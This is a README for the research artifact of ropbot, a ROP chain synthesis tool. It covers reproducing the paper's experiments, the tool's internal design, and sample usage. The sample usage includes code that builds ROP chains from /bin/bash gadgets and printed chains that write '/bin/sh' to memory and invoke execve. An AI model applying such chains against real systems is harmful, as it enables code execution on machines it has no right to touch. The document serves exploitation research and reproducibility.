# Overview
This folder contains files necessary to reproduce the results presented in the paper [__ropbot: Reimaging Code Reuse Attack Synthesis__](https://kylebot.net/papers/ropbot.pdf).
ropbot is tool that can generate code use attack payload (e.g., ROP chains) for given binaries.
It supports function calls, system calls, memory write, and more other functionalities using a graph search algorithm with the help with the ROPBlock abstraction.
It outperforms all existing state-of-the-art ROP chain generation tools in their own benchmarks.
And this folder contains enough information to replicate what we presented in the paper.

# Preparation
`docker` is needed to run the evaluation.
You need to download the dataset from [Zenodo](https://zenodo.org/records/17811054) and unpack it.

# Evaluation
All possible experiments are listed in `task_list.txt`.
Each command is an experiment by itself.
For example, `./run <dataset> ropbot x64 facefeed` will launch an experiment that evaluates ropbot's capability on generating the `0xfacefeed(0xdeadbeef, 0x40, 0x7b)` chain (a chain used in SGC and crackers) on x64 binaries. And `<dataset>` is the path to the unpacked dataset folder.

For the NDSS artifact evaluation, the following commands are needed for each experiments:
* E1
`./run <dataset> ropbot x64 facefeed`
* E2
`./run <dataset> ropbot x64 execve`
* E3
`./run <dataset> ropbot aarch64 facefeed`
`./run <dataset> ropbot arm facefeed`

After each command, a corresponding docker container will start running in the background. You should be able to see it using `docker ps`.
You can check the progress using `docker logs <container_id>`.
Once the container prints `Experiment finished!!!`, it signals the experiment is finished.
But the container will not exit, it will just still stay there, using zero compute power (it will be sleeping).
Then you can extract the output from the container by `docker cp <container_id>:/experiment/output.jsonl <dst_path>` and use `python results/pretty_print.py <dst_path>` to pretty print the results, matching what we present in the paper.

And you are more than welcome to run other experiments listed in `task_list.txt`.

# Detailed Rundown

The source code of ropbot is at `ropbot/angrop-ng.tar.gz`. And angrop-ng is the original name for ropbot to avoid deanonymization for the submission. It is significantly different from the public version of angrop (also developed by us) with 248 new commits.

`angr.tar.gz` and `archinfo.tar.gz` are just angr and archinfo with fixes for their RISC-V support. In fact, they are just the `wip/riscv` branch in each repo.

Here is the detailed rundown of how ropbot works. It consists of the following steps: finding gadgets, effect analysis, graph optimization, and chain generation.

## Finding Gadgets
ropbot will analyze all executable addresses and check whether they are gadgets using multiprocessing.

It involves the following steps:
1. `_slices_to_check` function in `angrop/gadget_finder/__init__.py` lists potential executable slices (a slice of exectuable addresses)
2. `_addresses_from_slice` statically analyze the address and return potentially interesting addresses
3. `analyze_gadget` function in `angrop/gadget_finder/gadget_analyzer.py` analyze each interesting address and return corresponding `RopGadget` object (if any)

## Effect Analysis
`RopGadget` inherits from `RopEffect`. Before the `analyze_gadget` function returns the `RopGadget` object, it will do a `_effect_analysis` call (`gadget_analyzer.py`) using symbolic execution.
There is a similar function `_analyze_effect` in `angrop/rop_block.py`, which is meant to analyze the effects for `RopBlocks`.

Notice that in the implementation, `RopGadget` has a `self_contained` property while `RopBlock` doesn't. This is because `RopBlocks` are guaranteed to be `self_contained` after normalization (`normalize_gadget` in `angrop/chain_builder/builder.py`).

## Graph Optimization
The iteractive graph optimization involves two steps as mentioned in the paper: 1. optimize the register moving graph 2. optimizing the register setting graph. They are implemented as the `optimize` function for `RegMover` and `RegSetter`.

`RegMover.optimize` tries to normalize non-self-contained gadgets that provide unique capabilities and `RegSetter.optimize` tries to 1. see whether we can gain new register setting capability by using the register moving graph (there is a register moving chain and we can set the source register and cannot set the destination register) and 2. normalize non-self-contained gadgets that provide unique capabilities.

The iteractive process is implemented in `ChainBuilder.optimize` in `angrop/chain_builder/__init__.py`.

## Chain Generation
The register setting functionality is implemented in `RegSetter.run`. The core function where the graph building/solving algorithm happens is `find_candidate_chains_giga_graph_search`.

The function/syscall calling functionalities are implemented in `SysCaller` and `FuncCaller`, where `SysCaller` relies on `FuncCaller`, it only handles some convenient functions like `execve`, the actual logic happens in `FuncCaller`. Its `_func_call` function is the way handles all kinda of different calling conventions. It will handle the stack cleanup or return register setting by querying the calling convention.

## Sample Usages
```
import angr
import angrop
from multiprocessing import cpu_count

proj = angr.Project("/bin/bash", load_options={'main_opts':{'base_addr': 0}})
rop = proj.analyses.ROP(fast_mode=False, max_sym_mem_access=1)
rop.find_gadgets(processes=cpu_count(), show_progress=True)
chain = rop.func_call(0xfacefeed, [0xdeadbeef, 0x40, 0x7b], needs_return=False)
chain.print_payload_code()

state = chain.concrete_exec_til_addr(0xfacefeed)
print("====== chain execution result =====")
print("PC:", state.ip)
print("RDI:", state.regs.rdi)
print("RSI:", state.regs.rsi)
print("RDX:", state.regs.rdx)
print()
```

And `chain` is a `RopChain` object, you can do `chain.payload_code()` to get python payload string or `chain.print_payload_code()` to just print it.
`chain.exec()` will try to symbolically execute the chain and expect to enter an unconstrained state, which is not applicable here because the chain will stop at `0xfacefeed`.
Instead, `concrete_exec_til_addr` will execute the chain until the `PC` becomes the target value (here `0xfacefeed`).

Another sample usage is here:
```
[ins] In [10]: chain = rop.write_to_mem(0x41414141, b"/bin/sh\x00") + rop.func_call(0xfacefeed, [0x41414141, 0, 0])

[ins] In [11]: chain.pp()
0x00000000000e501e: pop rsi; ret 0
                    0x68732f6e69622f
0x000000000004a1dd: pop rdi; mov edx, 0x89480002; ret 
                    0x41414131
0x00000000000a7607: mov qword ptr [rdi + 0x10], rsi; ret 
0x00000000000e501e: pop rsi; ret 0
                    0x0
0x000000000004a1dd: pop rdi; mov edx, 0x89480002; ret 
                    0x41414141
0x0000000000036083: pop rax; pop rbx; pop rbp; ret 
                    0x158124
                    <BV64 Reverse(symbolic_stack_6_3013_64)>
                    <BV64 Reverse(symbolic_stack_7_3014_64)>
0x000000000005bbfe: pop rdx; std ; dec dword ptr [rax - 0x77]; ret 
                    0x0
0x00000000facefeed: <func_0xfacefeed>
                    <BV64 next_pc_3038_64>
```

This above simulates an `execve` example and demonstrates its chainability.

Yet another example is here:
```
[ins] In [15]: chain = rop.execve()

[ins] In [16]: chain.pp()
0x00000000000e501e: pop rsi; ret 0
                    0x68732f6e69622f
0x000000000004a1dd: pop rdi; mov edx, 0x89480002; ret 
                    0x1580c1
0x00000000000a7607: mov qword ptr [rdi + 0x10], rsi; ret 
0x000000000004a1dd: pop rdi; mov edx, 0x89480002; ret 
                    0x1580d1
0x0000000000036083: pop rax; pop rbx; pop rbp; ret 
                    0x158164
                    <BV64 Reverse(symbolic_stack_4_3393_64)>
                    <BV64 Reverse(symbolic_stack_5_3394_64)>
0x000000000005bbfe: pop rdx; std ; dec dword ptr [rax - 0x77]; ret 
                    0x0
0x00000000000d48f0: pop rsi; mov eax, esi; pop rbp; ret 
                    0x3b
                    <BV64 Reverse(symbolic_stack_10_3399_64)>
0x00000000000e501e: pop rsi; ret 0
                    0x0
0x0000000000119862: syscall
```
This above example actually does `execve`.
